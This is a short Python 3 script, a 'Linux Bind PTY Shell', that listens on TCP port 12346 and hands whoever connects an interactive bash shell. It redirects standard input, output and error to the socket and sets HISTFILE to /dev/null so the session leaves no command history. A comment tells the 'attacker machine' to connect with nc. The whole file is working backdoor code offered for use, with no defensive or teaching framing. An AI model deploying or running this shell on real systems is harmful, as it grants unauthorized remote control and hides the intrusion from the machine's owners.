#!/usr/bin/python3

""" Python 3.6 Linux Bind PTY Shell """

# Usage: nc -v <ipaddress> 12346 in the attacker machine to connect to the shell

import os
import pty
import socket

PORT = 12346

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', PORT))
s.listen(1)
(rem, addr) = s.accept()
os.dup2(rem.fileno(),0)
os.dup2(rem.fileno(),1)
os.dup2(rem.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()



